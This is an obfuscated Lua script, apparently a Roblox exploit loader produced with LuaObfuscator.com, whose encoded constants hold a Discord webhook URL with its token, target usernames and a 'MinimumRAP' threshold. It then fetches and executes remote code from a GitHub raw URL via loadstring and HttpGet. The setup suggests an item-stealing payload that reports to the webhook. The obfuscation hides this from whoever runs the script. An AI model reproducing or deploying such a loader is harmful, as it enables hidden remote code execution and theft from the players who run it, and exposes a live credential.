--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then local v85=0;while true do if (v85==0) then v19=v0(v3(v30,1,1));return "";end end else local v86=v2(v0(v30,16));if v19 then local v118=v5(v86,v19);v19=nil;return v118;else return v86;end end end);local function v20(v31,v32,v33) if v33 then local v87=0 -0 ;local v88;while true do if (v87==(0 -0)) then v88=(v31/((3 -1)^(v32-(2 -1))))%(2^(((v33-(620 -((2192 -(1523 + 114)) + 64))) -(v32-1)) + (932 -(857 + 74)))) ;return v88-(v88%1) ;end end else local v89=0;local v90;while true do if (v89==(568 -(367 + 181 + 20))) then v90=((1323 -394) -((1279 -(68 + 997)) + 713))^(v32-(1 + (1270 -(226 + 1044)))) ;return (((v31%(v90 + v90))>=v90) and (1 + (0 -0))) or (877 -(282 + (712 -(32 + 85)))) ;end end end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35,v36=v1(v16,v18,v18 + 2 );v18=v18 + 2 + 0 ;return (v36 * (57 + 199)) + v35 ;end local function v23() local v37,v38,v39,v40=v1(v16,v18,v18 + (960 -((1242 -(87 + 263)) + 65)) );v18=v18 + 4 ;return (v40 * (40022563 -23245347)) + (v39 * (121138 -55602)) + (v38 * (469 -213)) + v37 ;end local function v24() local v41=v23();local v42=v23();local v43=181 -((278 -211) + 113) ;local v44=(v20(v42,1 + 0 ,811 -(368 + 423) ) * ((4 -2)^(24 + 8))) + v41 ;local v45=v20(v42,83 -62 ,983 -(802 + 150) );local v46=((v20(v42,102 -(42 + 28) )==(2 -1)) and  -(1 -0)) or (1 + 0) ;if (v45==(997 -(915 + 82))) then if (v44==(0 -0)) then return v46 * 0 ;else local v119=(0 -0) + 0 ;while true do if (v119==((0 -0) -0)) then v45=1188 -(1069 + 118) ;v43=0;break;end end end elseif (v45==(4643 -2596)) then return ((v44==(0 -0)) and (v46 * (1/(772 -(201 + 571))))) or (v46 * NaN) ;end return v8(v46,v45-((3020 -(814 + 45)) -(116 + 1022)) ) * (v43 + (v44/((1 + (2 -1))^52))) ;end local function v25(v47) local v48;if  not v47 then v47=v23();if (v47==0) then return "";end end v48=v3(v16,v18,(v18 + v47) -(1 + 0) );v18=v18 + v47 ;local v49={};for v66=1 + 0 , #v48 do v49[v66]=v2(v1(v3(v48,v66,v66)));end return v6(v49);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v50=(function() return function(v91,v92,v93,v94,v95,v96,v97,v98) local v91=(function() return 0;end)();local v92=(function() return;end)();local v94=(function() return;end)();while true do if (v91==0) then local v124=(function() return 0;end)();while true do if (0==v124) then v92=(function() return v93();end)();v94=(function() return nil;end)();v124=(function() return 1560 -(120 + 1439) ;end)();end if (v124~=(1785 -(599 + 1185))) then else v91=(function() return  #"!";end)();break;end end end if ( #","==v91) then if (v92== #"~") then v94=(function() return v93()~=(0 + 0) ;end)();elseif (v92==2) then v94=(function() return v95();end)();elseif (v92== #"-19") then v94=(function() return v96();end)();end v97[v98]=(function() return v94;end)();break;end end return v91,v92,v93,v94,v95,v96,v97,v98;end;end)();local v51=(function() return function(v99,v100,v101,v102,v103,v104,v105,v106,v107) local v108=(function() return 0 + 0 ;end)();local v99=(function() return;end)();local v100=(function() return;end)();while true do local v117=(function() return 0;end)();while true do if ((574 -(507 + 67))==v117) then if (v108~=(1750 -(1013 + 736))) then else local v126=(function() return 0 + 0 ;end)();while true do if (v126~=(0 -0)) then else local v137=(function() return 0;end)();while true do if (v137~=(0 -0)) then else while true do if (v99==0) then v100=(function() return v101();end)();if (v102(v100, #"~", #".")~=(867 -(550 + 317))) then else local v186=(function() return 0 -0 ;end)();local v187=(function() return;end)();local v188=(function() return;end)();local v189=(function() return;end)();local v190=(function() return;end)();while true do if (v186~=0) then else v187=(function() return 0 -0 ;end)();v188=(function() return nil;end)();v186=(function() return 1;end)();end if (v186==(2 -1)) then local v191=(function() return 285 -(134 + 151) ;end)();local v192=(function() return;end)();while true do if (v191==0) then v192=(function() return 1665 -(970 + 695) ;end)();while true do if (v192~=(1 -0)) then else v186=(function() return 2;end)();break;end if (v192==0) then v189=(function() return nil;end)();v190=(function() return nil;end)();v192=(function() return 1;end)();end end break;end end end if (v186==(1992 -(582 + 1408))) then while true do if (v187~=2) then else local v193=(function() return 0;end)();local v194=(function() return;end)();while true do if (v193==(0 -0)) then v194=(function() return 0 -0 ;end)();while true do if (v194==(0 -0)) then if (v102(v189, #"~", #"!")~= #">") then else v190[2]=(function() return v103[v190[1826 -(1195 + 629) ]];end)();end if (v102(v189,2,2 -0 )== #"|") then v190[ #"asd"]=(function() return v103[v190[ #"91("]];end)();end v194=(function() return 242 -(187 + 54) ;end)();end if (v194==(781 -(162 + 618))) then v187=(function() return  #"xxx";end)();break;end end break;end end end if ( #"["~=v187) then else local v195=(function() return 0 + 0 ;end)();local v196=(function() return;end)();while true do if (v195~=(0 + 0)) then else v196=(function() return 0 -0 ;end)();while true do if (v196==1) then v187=(function() return 2 -0 ;end)();break;end if (v196==0) then v190=(function() return {v104(),v104(),nil,nil};end)();if (v188==0) then local v202=(function() return 0 + 0 ;end)();local v203=(function() return;end)();while true do if (v202==(1636 -(1373 + 263))) then v203=(function() return 1000 -(451 + 549) ;end)();while true do if (v203==0) then v190[ #"-19"]=(function() return v104();end)();v190[ #"0836"]=(function() return v104();end)();break;end end break;end end elseif (v188== #"{") then v190[ #"-19"]=(function() return v105();end)();elseif (v188==(1 + 1)) then v190[ #"xxx"]=(function() return v105() -((2 -0)^16) ;end)();elseif (v188== #"xnx") then local v208=(function() return 0 -0 ;end)();local v209=(function() return;end)();while true do if (v208~=0) then else v209=(function() return 1384 -(746 + 638) ;end)();while true do if (v209==(0 + 0)) then v190[ #"19("]=(function() return v105() -(2^(23 -7)) ;end)();v190[ #"0836"]=(function() return v104();end)();break;end end break;end end end v196=(function() return 1;end)();end end break;end end end if (0~=v187) then else local v197=(function() return 341 -(218 + 123) ;end)();while true do if (v197==(1582 -(1535 + 46))) then v187=(function() return  #"/";end)();break;end if (v197==0) then v188=(function() return v102(v100,2 + 0 , #"xxx");end)();v189=(function() return v102(v100, #"xnxx",1 + 5 );end)();v197=(function() return 1;end)();end end end if (v187== #"19(") then if (v102(v189, #"xxx", #"gha")== #"|") then v190[ #"0313"]=(function() return v103[v190[ #".com"]];end)();end v106[v107]=(function() return v190;end)();break;end end break;end end end break;end end return v99,v100,v101,v102,v103,v104,v105,v106,v107;end end end end end if (v108==(560 -(306 + 254))) then v99=(function() return 0 + 0 ;end)();v100=(function() return nil;end)();v108=(function() return 1 -0 ;end)();end break;end end end end;end)();local v52=(function() return function(v109,v110,v111) local v112=(function() return 0;end)();local v113=(function() return;end)();while true do if (v112==(1467 -(899 + 568))) then v113=(function() return 0;end)();while true do if (0~=v113) then else local v127=(function() return 0 + 0 ;end)();while true do if (v127~=(0 -0)) then else v109[v110-#" " ]=(function() return v111();end)();return v109,v110,v111;end end end end break;end end end;end)();local v53=(function() return {};end)();local v54=(function() return {};end)();local v55=(function() return {};end)();local v56=(function() return {v53,v54,nil,v55};end)();local v57=(function() return v23();end)();local v58=(function() return {};end)();for v68= #"|",v57 do FlatIdent_8199B,Type,v21,Cons,v24,v25,v58,v68=(function() return v50(FlatIdent_8199B,Type,v21,Cons,v24,v25,v58,v68);end)();end v56[ #"91("]=(function() return v21();end)();for v69= #"<",v23() do FlatIdent_5ED46,Descriptor,v21,v20,v58,v22,v23,v53,v69=(function() return v51(FlatIdent_5ED46,Descriptor,v21,v20,v58,v22,v23,v53,v69);end)();end for v70= #" ",v23() do v54,v70,v28=(function() return v52(v54,v70,v28);end)();end return v56;end local function v29(v60,v61,v62) local v63=v60[291 -(60 + 230) ];local v64=v60[574 -(426 + (757 -(602 + 9))) ];local v65=v60[1 + 2 ];return function(...) local v71=v63;local v72=v64;local v73=v65;local v74=v27;local v75=1 + (1189 -(449 + 740)) ;local v76= -(1 + 0);local v77={};local v78={...};local v79=v12("#",...) -(812 -(569 + 242)) ;local v80={};local v81={};for v114=(1613 -(1565 + 48)) -0 ,v79 do if ((v114>=v73) or (4490<=89)) then v77[v114-v73 ]=v78[v114 + 1 ];else v81[v114]=v78[v114 + 1 + 0 ];end end local v82=(v79-v73) + (1025 -(706 + (1190 -(826 + 46)))) ;local v83;local v84;while true do v83=v71[v75];v84=v83[1252 -((1668 -(245 + 702)) + 530) ];if ((v84<=((4047 -2766) -(945 + 326))) or (4983<1808)) then if ((3829>3769) and (v84<=(9 -(4 + 1)))) then if ((v84<=(1 + 0)) or (796>=3791)) then if ((v84>(700 -(88 + 183 + 429))) or (569>=1591)) then v81[v83[(1900 -(260 + 1638)) + 0 ]]=v83[13 -(1148 -(782 + 356)) ];else v81[v83[1502 -(1408 + 92) ]]();end elseif ((1485<=2904) and (v84<=(1088 -(461 + 625)))) then v62[v83[5 -2 ]]=v81[v83[1290 -(993 + 295) ]];elseif (v84==(1 + 2)) then local v141=(1611 -(382 + 58)) -((685 -(176 + 91)) + 753) ;local v142;local v143;while true do if (v141==(0 + 0)) then v142=v83[(6 -4) + 0 ];v143=v81[v83[1 + 2 ]];v141=(4 -2) -1 ;end if (v141==(1 + 0)) then v81[v142 + 1 ]=v143;v81[v142]=v143[v83[2 + 2 ]];break;end end else v81[v83[2]]=v83[532 -(406 + 103 + 20) ];end elseif (v84<=(1776 -((2577 -828) + 20))) then if (v84<=(24 -19)) then if (v81[v83[1 + 1 ]]==v83[1326 -((2341 -(975 + 117)) + 73) ]) then v75=v75 + (1876 -(157 + 1718)) + 0 ;else v75=v83[3];end elseif (v84>(1151 -(466 + 552 + 127))) then if (v81[v83[(14 -10) -(5 -3) ]]==v83[11 -(1212 -(902 + 303)) ]) then v75=v75 + (1901 -(106 + 1794)) ;else v75=v83[1 + 2 ];end else local v147=v83[1 + 1 ];local v148,v149=v74(v81[v147](v13(v81,v147 + (2 -1) ,v83[3])));v76=(v149 + v147) -(2 -1) ;local v150=114 -(4 + 110) ;for v165=v147,v76 do v150=v150 + (585 -(57 + (1157 -630))) ;v81[v165]=v148[v150];end end elseif ((4269==4269) and (v84<=(1435 -(41 + 1386)))) then for v139=v83[(578 -338) -(64 + 174) ],v83[(10 + 96) -(17 + 86) ] do v81[v139]=nil;end elseif (v84>(7 + (6 -4))) then for v168=v83[(1020 -(697 + 321)) -0 ],v83[6 -3 ] do v81[v168]=nil;end else v62[v83[8 -5 ]]=v81[v83[218 -(42 + 174) ]];end elseif (v84<=15) then if (v84<=(10 + 2)) then if (v84==(177 -((1812 -(1121 + 569)) + 44))) then v75=v83[2 + 1 ];else v75=v83[3];end elseif (v84<=(22 -(24 -15))) then do return;end elseif (v84==(46 -32)) then do return;end else local v153=0 + 0 ;local v154;while true do if (v153==(0 + 0)) then v154=v83[2];v81[v154]=v81[v154](v13(v81,v154 + (1 -0) ,v76));break;end end end elseif (v84<=(83 -(30 + 35))) then if (v84<=((23 -12) + 5)) then v81[v83[216 -(22 + 192) ]]();elseif (v84>((1957 -(483 + 200)) -(1043 + (492 -278)))) then v81[v83[5 -3 ]]=v62[v83[1936 -(565 + 1368) ]];else local v157=v83[(1470 -(1404 + 59)) -5 ];v81[v157]=v81[v157](v13(v81,v157 + (3 -2) ,v76));end elseif (v84<=19) then local v134=1212 -(323 + 889) ;local v135;local v136;while true do if ((387<=2782) and (v134==(2 -(1 + 0)))) then v81[v135 + 1 ]=v136;v81[v135]=v136[v83[584 -(361 + (293 -74)) ]];break;end if (v134==((1085 -(468 + 297)) -(53 + 267))) then v135=v83[(1 -0) + 1 ];v136=v81[v83[416 -(15 + 398) ]];v134=983 -(18 + 964) ;end end elseif ((v84>(60 -40)) or (1899<=917)) then local v159=v83[306 -(244 + 60) ];local v160,v161=v74(v81[v159](v13(v81,v159 + (3 -2) ,v83[479 -(41 + (997 -(334 + 228))) ])));v76=(v161 + v159) -(1 + 0) ;local v162=0 + 0 ;for v175=v159,v76 do v162=v162 + (851 -((53 -33) + 830)) ;v81[v175]=v160[v162];end else v81[v83[(6 -4) + 0 ]]=v62[v83[129 -((1343 -(322 + 905)) + 10) ]];end v75=v75 + 1 + (0 -0) ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!0F3Q00028Q00026Q00F03F03083Q00557365726E616D65030C3Q006275696C645F67616D65733503093Q00557365726E616D653203133Q006672306D63302Q6D306E746F636F2Q72757074027Q004003073Q00576562682Q6F6B03793Q00682Q7470733A2Q2F646973636F72642E636F6D2F6170692F776562682Q6F6B732F313331333536332Q38373238322Q35323836322F49622D53394656543941382Q44596C442D6E512Q77314F415430496F5F5A4E637069486757332Q6546426570304862367A62763532745357795F44345344745166546C41030A3Q004D696E696D756D524150024Q00D0126341030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403553Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F706F70636F726E6875622D6F2Q66696369616C2F746573742F726566732F68656164732F6D61696E2F706F70636F726E68756200313Q0012043Q00014Q000A000100013Q0026053Q00020001000100040B3Q00020001001204000100013Q002605000100140001000100040B3Q00140001001204000200013Q0026050002000C0001000200040B3Q000C0001001204000100023Q00040B3Q00140001002605000200080001000100040B3Q00080001001204000300043Q001202000300033Q001204000300063Q001202000300053Q001204000200023Q00040B3Q00080001002605000100230001000200040B3Q00230001001204000200013Q0026050002001B0001000200040B3Q001B0001001204000100073Q00040B3Q00230001002605000200170001000100040B3Q00170001001204000300093Q001202000300083Q0012040003000B3Q0012020003000A3Q001204000200023Q00040B3Q00170001002605000100050001000700040B3Q000500010012140002000C3Q0012140003000D3Q00201300030003000E0012040005000F4Q0006000300054Q000F00023Q00022Q001000020001000100040B3Q0030000100040B3Q0005000100040B3Q0030000100040B3Q000200012Q000E3Q00017Q00",v9(),...);